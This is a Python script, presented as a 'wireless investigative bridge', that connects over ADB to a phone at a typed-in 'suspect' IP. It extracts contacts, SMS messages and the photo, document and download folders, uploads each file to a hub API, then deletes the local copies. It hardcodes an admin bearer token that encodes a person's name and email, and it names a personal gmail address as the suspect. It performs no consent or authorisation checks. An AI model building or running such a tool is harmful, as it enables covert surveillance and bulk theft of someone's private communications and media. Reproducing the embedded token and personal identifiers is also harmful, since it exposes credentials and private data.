import subprocess
import requests
import os
import sys

# Configuration for the StreamVista Hub
HUB_URL = "http://localhost:3000" 
JWT_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEsImZ1bGxOYW1lIjoiQWJpaml0aCBBc29rYW4iLCJlbWFpbCI6ImFiaWppdGhhc29rYW5AY3JheW9uc3BpY3R1cmVzLmNvbSIsIndvcmtzcGFjZSI6InN0dWRpbyIsInRvbGUiOiJhZG1pbiIsImlhdCI6MTc4Mjg4NzE2NCwiZXhwIjoxNzgzNDkxOTY0fQ.BkBCS2wFRvseTBNUKd6zc3bmqJe5Uk2rGzf_z2Z2seM"
SUSPECT_ID = "arjunajith941@gmail.com"

# This variable will be set after a successful wireless connection
DEVICE_ID = None

def run_adb(command):
    try:
        # If a device is specifically connected via wireless, use -s
        cmd_prefix = ["adb", "-s", DEVICE_ID] if DEVICE_ID else ["adb"]
        result = subprocess.run(cmd_prefix + command.split(), capture_output=True, text=True, check=True)
        return result.stdout
    except Exception as e:
        print(f"[FieldAgent] ADB Error: {e}")
        return None

def connect_wireless(ip, port="5555"):
    print(f"[FieldAgent] Attempting Wireless Connection to {ip}:{port}...")
    result = subprocess.run(["adb", "connect", f"{ip}:{port}"], capture_output=True, text=True)
    if "connected" in result.stdout:
        print(f"[FieldAgent] Wireless Link Established.")
        global DEVICE_ID
        DEVICE_ID = f"{ip}:{port}"
        return True
    else:
        print(f"[FieldAgent] Connection Failed: {result.stdout}")
        return False

def extract_contacts():
    print("[FieldAgent] Extracting Contacts...")
    contacts = run_adb("shell content query --uri content://com.android.contacts/data --projection display_name:data1")
    if contacts:
        file_path = "contacts_extraction.txt"
        with open(file_path, "w") as f:
            f.write(contacts)
        return file_path
    return None

def extract_conversations():
    print("[FieldAgent] Extracting SMS Conversations...")
    sms = run_adb("shell content query --uri content://sms --projection address:body:date")
    if sms:
        file_path = "conversations_extraction.txt"
        with open(file_path, "w") as f:
            f.write(sms)
        return file_path
    return None

def sync_storage():
    print("[FieldAgent] Initiating Full Media & Document Sync...")
    # Standard Android storage paths
    folders_to_sync = ["/sdcard/DCIM", "/sdcard/Pictures", "/sdcard/Documents", "/sdcard/Download"]
    
    for folder in folders_to_sync:
        print(f"[FieldAgent] Syncing {folder}...")
        folder_name = folder.split("/")[-1]
        
        # Pulling files one by one would be complex here, 
        # so we pull the folder locally first (standard ADB behavior)
        subprocess.run(["adb", "-s", DEVICE_ID, "pull", folder, f"./{folder_name}"])
        
        # Upload every file in the pulled directory
        if os.path.exists(f"./{folder_name}"):
            for root, dirs, files in os.walk(f"./{folder_name}"):
                for file in files:
                    file_path = os.path.join(root, file)
                    upload_to_hub(file_path)

def upload_to_hub(file_path):
    if not file_path or not os.path.exists(file_path):
        return

    url = f"{HUB_URL}/api/ingest"
    headers = {"Authorization": f"Bearer {JWT_TOKEN}"}
    files = {'file': open(file_path, 'rb')}
    data = {'useDataBox': 'true', 'suspectId': SUSPECT_ID}

    try:
        response = requests.post(url, headers=headers, files=files, data=data)
        if response.status_code == 200:
            print(f"[FieldAgent] Synced: {file_path}")
            os.remove(file_path) # Clean up after sync
        else:
            print(f"[FieldAgent] Hub Sync Failed for {file_path}: {response.text}")
    except Exception as e:
        print(f"[FieldAgent] Connection Error: {e}")

def main():
    print(f"=== StreamVista Field Agent - Wireless Investigative Bridge ===")
    print(f"Target Suspect: {SUSPECT_ID}")
    
    ip_addr = input("Enter Suspect Device IP: ")
    port_num = input("Enter Port (default 5555): ") or "5555"

    if connect_wireless(ip_addr, port_num):
        # 1. Contacts
        contacts_file = extract_contacts()
        upload_to_hub(contacts_file)

        # 2. Conversations
        convos_file = extract_conversations()
        upload_to_hub(convos_file)

        # 3. Storage
        sync_storage()
        
        print("=== Wireless Investigative Sync Complete ===")

if __name__ == "__main__":
    main()
